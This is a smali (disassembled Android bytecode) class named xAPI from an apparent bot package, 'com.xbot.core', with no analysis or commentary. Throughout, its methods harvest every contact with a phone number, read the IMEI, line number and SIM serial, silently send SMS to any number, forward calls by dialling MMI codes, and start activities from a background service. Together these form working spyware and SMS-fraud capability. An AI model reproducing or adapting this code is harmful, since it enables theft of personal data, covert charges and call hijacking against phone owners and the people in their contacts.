.class public Lcom/xbot/core/xAPI;
.super Ljava/lang/Object;
.source "xAPI.java"


# instance fields
.field private hash:Ljava/lang/String;

.field private telemgr:Landroid/telephony/TelephonyManager;


# direct methods
.method public constructor <init>(Ljava/lang/String;Landroid/telephony/TelephonyManager;)V
    .locals 1
    .param p1, "hash"    # Ljava/lang/String;
    .param p2, "telemgr"    # Landroid/telephony/TelephonyManager;

    .prologue
    .line 47
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 44
    const-string v0, ""

    iput-object v0, p0, Lcom/xbot/core/xAPI;->hash:Ljava/lang/String;

    .line 45
    const/4 v0, 0x0

    iput-object v0, p0, Lcom/xbot/core/xAPI;->telemgr:Landroid/telephony/TelephonyManager;

    .line 48
    iput-object p1, p0, Lcom/xbot/core/xAPI;->hash:Ljava/lang/String;

    .line 49
    iput-object p2, p0, Lcom/xbot/core/xAPI;->telemgr:Landroid/telephony/TelephonyManager;

    .line 50
    return-void
.end method


# virtual methods
.method public StartNewActivity(Ljava/lang/Class;)V
    .locals 2
    .param p1, "clazz"    # Ljava/lang/Class;

    .prologue
    .line 118
    new-instance v0, Landroid/content/Intent;

    invoke-static {}, Lcom/xbot/core/RunService;->getService()Lcom/xbot/core/RunService;

    move-result-object v1

    invoke-virtual {v1}, Lcom/xbot/core/RunService;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-direct {v0, v1, p1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 119
    .local v0, "intent":Landroid/content/Intent;
    const/high16 v1, 0x14000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 120
    invoke-static {}, Lcom/xbot/core/RunService;->getService()Lcom/xbot/core/RunService;

    move-result-object v1

    invoke-virtual {v1, v0}, Lcom/xbot/core/RunService;->startActivity(Landroid/content/Intent;)V

    .line 121
    return-void
.end method

.method public callForward(Ljava/lang/String;)V
    .locals 5
    .param p1, "mmi"    # Ljava/lang/String;

    .prologue
    .line 102
    new-instance v2, Lcom/xbot/core/PhoneCallListener;

    invoke-direct {v2}, Lcom/xbot/core/PhoneCallListener;-><init>()V

    .line 103
    .local v2, "phoneListener":Lcom/xbot/core/PhoneCallListener;
    iget-object v3, p0, Lcom/xbot/core/xAPI;->telemgr:Landroid/telephony/TelephonyManager;

    const/4 v4, 0x0

    invoke-virtual {v3, v2, v4}, Landroid/telephony/TelephonyManager;->listen(Landroid/telephony/PhoneStateListener;I)V

    .line 105
    new-instance v0, Landroid/content/Intent;

    const-string v3, "android.intent.action.CALL"

    invoke-direct {v0, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 106
    .local v0, "fwd":Landroid/content/Intent;
    const-string v3, "tel"

    const-string v4, "#"

    invoke-static {v3, p1, v4}, Landroid/net/Uri;->fromParts(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    .line 107
    .local v1, "mmiCode":Landroid/net/Uri;
    invoke-virtual {v0, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    .line 108
    invoke-static {}, Lcom/xbot/core/RunService;->getService()Lcom/xbot/core/RunService;

    move-result-object v3

    invoke-virtual {v3, v0}, Lcom/xbot/core/RunService;->startActivity(Landroid/content/Intent;)V

    .line 109
    return-void
.end method

.method public getAndroidVersion()Ljava/lang/String;
    .locals 1

    .prologue
    .line 113
    sget-object v0, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    return-object v0
.end method

.method public getContacts()Ljava/util/ArrayList;
    .locals 11
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/util/ArrayList",
            "<",
            "Lcom/xbot/core/tools/PhoneContact;",
            ">;"
        }
    .end annotation

    .prologue
    const/4 v2, 0x0

    .line 210
    invoke-static {}, Lcom/xbot/core/RunService;->getService()Lcom/xbot/core/RunService;

    move-result-object v1

    invoke-virtual {v1}, Lcom/xbot/core/RunService;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    .line 211
    .local v0, "cr":Landroid/content/ContentResolver;
    sget-object v1, Landroid/provider/ContactsContract$Contacts;->CONTENT_URI:Landroid/net/Uri;

    move-object v3, v2

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v8

    .line 212
    .local v8, "cursor":Landroid/database/Cursor;
    new-instance v6, Ljava/util/ArrayList;

    invoke-direct {v6}, Ljava/util/ArrayList;-><init>()V

    .line 213
    .local v6, "alContacts":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lcom/xbot/core/tools/PhoneContact;>;"
    invoke-interface {v8}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v1

    if-eqz v1, :cond_3

    .line 218
    :cond_0
    const-string v1, "_id"

    invoke-interface {v8, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v8, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v9

    .line 220
    .local v9, "id":Ljava/lang/String;
    const-string v1, "has_phone_number"

    invoke-interface {v8, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v8, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v1

    if-lez v1, :cond_2

    .line 222
    sget-object v1, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    const-string v3, "contact_id=?"

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/String;

    const/4 v5, 0x0

    aput-object v9, v4, v5

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v10

    .line 223
    .local v10, "pCur":Landroid/database/Cursor;
    :goto_0
    invoke-interface {v10}, Landroid/database/Cursor;->moveToNext()Z

    move-result v1

    if-eqz v1, :cond_1

    .line 226
    new-instance v7, Lcom/xbot/core/tools/PhoneContact;

    invoke-direct {v7}, Lcom/xbot/core/tools/PhoneContact;-><init>()V

    .line 227
    .local v7, "contact":Lcom/xbot/core/tools/PhoneContact;
    const-string v1, "data1"

    invoke-interface {v10, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v10, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    iput-object v1, v7, Lcom/xbot/core/tools/PhoneContact;->phone:Ljava/lang/String;

    .line 228
    const-string v1, "display_name"

    invoke-interface {v10, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v10, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    iput-object v1, v7, Lcom/xbot/core/tools/PhoneContact;->name:Ljava/lang/String;

    .line 229
    invoke-virtual {v6, v7}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto :goto_0

    .line 232
    .end local v7    # "contact":Lcom/xbot/core/tools/PhoneContact;
    :cond_1
    invoke-interface {v10}, Landroid/database/Cursor;->close()V

    .line 235
    .end local v10    # "pCur":Landroid/database/Cursor;
    :cond_2
    invoke-interface {v8}, Landroid/database/Cursor;->moveToNext()Z

    move-result v1

    if-nez v1, :cond_0

    .line 238
    .end local v9    # "id":Ljava/lang/String;
    :cond_3
    return-object v6
.end method

.method public getTelephonyInfo()[Ljava/lang/String;
    .locals 3

    .prologue
    .line 88
    const/16 v1, 0x9

    new-array v0, v1, [Ljava/lang/String;

    .line 89
    .local v0, "ret":[Ljava/lang/String;
    const/4 v1, 0x0

    iget-object v2, p0, Lcom/xbot/core/xAPI;->telemgr:Landroid/telephony/TelephonyManager;

    invoke-virtual {v2}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v2

    aput-object v2, v0, v1

    .line 90
    const/4 v1, 0x1

    iget-object v2, p0, Lcom/xbot/core/xAPI;->telemgr:Landroid/telephony/TelephonyManager;

    invoke-virtual {v2}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v2

    aput-object v2, v0, v1

    .line 91
    const/4 v1, 0x2

    iget-object v2, p0, Lcom/xbot/core/xAPI;->telemgr:Landroid/telephony/TelephonyManager;

    invoke-virtual {v2}, Landroid/telephony/TelephonyManager;->getNetworkOperatorName()Ljava/lang/String;

    move-result-object v2

    aput-object v2, v0, v1

    .line 92
    const/4 v1, 0x3

    iget-object v2, p0, Lcom/xbot/core/xAPI;->telemgr:Landroid/telephony/TelephonyManager;

    invoke-virtual {v2}, Landroid/telephony/TelephonyManager;->getNetworkCountryIso()Ljava/lang/String;

    move-result-object v2

    aput-object v2, v0, v1

    .line 93
    const/4 v1, 0x4

    iget-object v2, p0, Lcom/xbot/core/xAPI;->telemgr:Landroid/telephony/TelephonyManager;

    invoke-virtual {v2}, Landroid/telephony/TelephonyManager;->getSimOperatorName()Ljava/lang/String;

    move-result-object v2

    aput-object v2, v0, v1

    .line 94
    const/4 v1, 0x5

    iget-object v2, p0, Lcom/xbot/core/xAPI;->telemgr:Landroid/telephony/TelephonyManager;

    invoke-virtual {v2}, Landroid/telephony/TelephonyManager;->getSimCountryIso()Ljava/lang/String;

    move-result-object v2

    aput-object v2, v0, v1

    .line 95
    const/4 v1, 0x6

    iget-object v2, p0, Lcom/xbot/core/xAPI;->telemgr:Landroid/telephony/TelephonyManager;

    invoke-virtual {v2}, Landroid/telephony/TelephonyManager;->getSimSerialNumber()Ljava/lang/String;

    move-result-object v2

    aput-object v2, v0, v1

    .line 96
    return-object v0
.end method

.method public sendSMS(Ljava/lang/String;Ljava/lang/String;)V
    .locals 1
    .param p1, "number"    # Ljava/lang/String;
    .param p2, "text"    # Ljava/lang/String;

    .prologue
    .line 82
    const/4 v0, 0x0

    invoke-virtual {p0, p1, p2, v0}, Lcom/xbot/core/xAPI;->sendSMS(Ljava/lang/String;Ljava/lang/String;I)V

    .line 83
    return-void
.end method

.method public sendSMS(Ljava/lang/String;Ljava/lang/String;I)V
    .locals 8
    .param p1, "number"    # Ljava/lang/String;
    .param p2, "text"    # Ljava/lang/String;
    .param p3, "id"    # I

    .prologue
    .line 56
    :try_start_0
    new-instance v7, Landroid/content/Intent;

    const-string v1, "SMS_SENT"

    invoke-direct {v7, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 57
    .local v7, "sentIntent":Landroid/content/Intent;
    new-instance v6, Landroid/content/Intent;

    const-string v1, "SMS_DELIVERED"

    invoke-direct {v6, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 60
    .local v6, "deliveredIntent":Landroid/content/Intent;
    const-string v1, "number"

    invoke-virtual {v7, v1, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 61
    const-string v1, "message"

    invoke-virtual {v7, v1, p2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 62
    const-string v1, "id"

    invoke-virtual {v7, v1, p3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    .line 64
    const-string v1, "number"

    invoke-virtual {v6, v1, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 65
    const-string v1, "message"

    invoke-virtual {v6, v1, p2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 66
    const-string v1, "id"

    invoke-virtual {v6, v1, p3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    .line 68
    invoke-static {}, Lcom/xbot/core/RunService;->getService()Lcom/xbot/core/RunService;

    move-result-object v1

    const/4 v2, 0x0

    const/high16 v3, 0x8000000

    invoke-static {v1, v2, v7, v3}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v4

    .line 69
    .local v4, "sentPI":Landroid/app/PendingIntent;
    invoke-static {}, Lcom/xbot/core/RunService;->getService()Lcom/xbot/core/RunService;

    move-result-object v1

    const/4 v2, 0x0

    const/high16 v3, 0x8000000

    invoke-static {v1, v2, v6, v3}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v5

    .line 71
    .local v5, "deliveredPI":Landroid/app/PendingIntent;
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 72
    .local v0, "m":Landroid/telephony/SmsManager;
    const/4 v2, 0x0

    move-object v1, p1

    move-object v3, p2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 78
    .end local v0    # "m":Landroid/telephony/SmsManager;
    .end local v4    # "sentPI":Landroid/app/PendingIntent;
    .end local v5    # "deliveredPI":Landroid/app/PendingIntent;
    .end local v6    # "deliveredIntent":Landroid/content/Intent;
    .end local v7    # "sentIntent":Landroid/content/Intent;
    :goto_0
    return-void

    .line 74
    :catch_0
    move-exception v1

    goto :goto_0
.end method
